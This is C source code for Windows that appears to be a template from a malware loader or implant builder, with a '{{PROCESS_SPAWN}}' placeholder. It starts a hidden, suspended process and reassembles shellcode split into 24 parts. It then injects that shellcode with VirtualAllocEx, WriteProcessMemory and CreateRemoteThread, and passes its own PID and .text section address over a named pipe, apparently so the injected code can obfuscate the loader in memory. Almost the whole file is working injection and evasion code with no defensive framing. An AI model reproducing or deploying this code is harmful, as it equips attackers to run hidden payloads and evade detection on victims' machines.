typedef struct {
    void* baseAddress;
    DWORD size;
} TextSectionInfo;


TextSectionInfo GetTextSectionInfo(HMODULE hModule) {
    
    TextSectionInfo info = { 0 };

    BYTE* baseAddr = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        if (section->Name[0] == '.' && section->Name[1] == 't' && section->Name[2] == 'e' && section->Name[3] == 'x' && section->Name[4] == 't') {
            info.baseAddress = baseAddr + section->VirtualAddress;
            info.size = section->Misc.VirtualSize;
            break;
        }
        ++section;
    }

    return info;
}


void memoryobfuscation(){

  
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    DWORD pid = GetCurrentProcessId();
    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) {
        return;
    }
    TextSectionInfo textInfo = GetTextSectionInfo(hModule);

    const char* exeName = "{{PROCESS_SPAWN}}";
    size_t bufferSize = 256;
    char* result = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize);
    wsprintfA(result, "\"%s\" %lu 0x%p 0x%lx", exeName, pid, textInfo.baseAddress, textInfo.size);



    const char* pipeName = "(\\\\.\\pipe\\5c8a150ae68b4cbc8b5eeacb0f89b7aa)";
    HANDLE hPipe = CreateNamedPipeA(
        pipeName,
        PIPE_ACCESS_OUTBOUND,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        0,0,0,
        NULL
    );

    if (!CreateProcessA(
        "{{PROCESS_SPAWN}}",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return;
    }

    // build shc array

    unsigned char* parts[] = {
        sidecar_bin_part_0, sidecar_bin_part_1, sidecar_bin_part_2,
        sidecar_bin_part_3, sidecar_bin_part_4, sidecar_bin_part_5,
        sidecar_bin_part_6, sidecar_bin_part_7, sidecar_bin_part_8,
        sidecar_bin_part_9, sidecar_bin_part_10, sidecar_bin_part_11,
        sidecar_bin_part_12, sidecar_bin_part_13, sidecar_bin_part_14,
        sidecar_bin_part_15, sidecar_bin_part_16, sidecar_bin_part_17,
        sidecar_bin_part_18, sidecar_bin_part_19, sidecar_bin_part_20,
        sidecar_bin_part_21, sidecar_bin_part_22, sidecar_bin_part_23
    };
    unsigned int lengths[] = {
        sidecar_bin_part_0_len, sidecar_bin_part_1_len, sidecar_bin_part_2_len,
        sidecar_bin_part_3_len, sidecar_bin_part_4_len, sidecar_bin_part_5_len,
        sidecar_bin_part_6_len, sidecar_bin_part_7_len, sidecar_bin_part_8_len,
        sidecar_bin_part_9_len, sidecar_bin_part_10_len, sidecar_bin_part_11_len,
        sidecar_bin_part_12_len, sidecar_bin_part_13_len, sidecar_bin_part_14_len,
        sidecar_bin_part_15_len, sidecar_bin_part_16_len, sidecar_bin_part_17_len,
        sidecar_bin_part_18_len, sidecar_bin_part_19_len, sidecar_bin_part_20_len,
        sidecar_bin_part_21_len, sidecar_bin_part_22_len, sidecar_bin_part_23_len
    };
    int num_parts = sizeof(parts) / sizeof(parts[0]);
    unsigned int sidecar_bin_len = 0;
    for (int i = 0; i < num_parts; ++i) {
        sidecar_bin_len += lengths[i];
    }
    unsigned char* sidecar_bin = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, sidecar_bin_len);
    unsigned int offset = 0;
    for (int i = 0; i < num_parts; ++i) {
        CopyMemory(sidecar_bin + offset, parts[i], lengths[i]);
        offset += lengths[i];
    }

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sidecar_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        return;
    }

    if (!WriteProcessMemory(pi.hProcess, remoteMem, sidecar_bin, sidecar_bin_len, NULL)) {
        return;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        return;
    }
    ConnectNamedPipe(hPipe, NULL);
    DWORD bytesWritten;
    WriteFile(hPipe, result, (DWORD)lstrlenA(result), &bytesWritten, NULL);

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
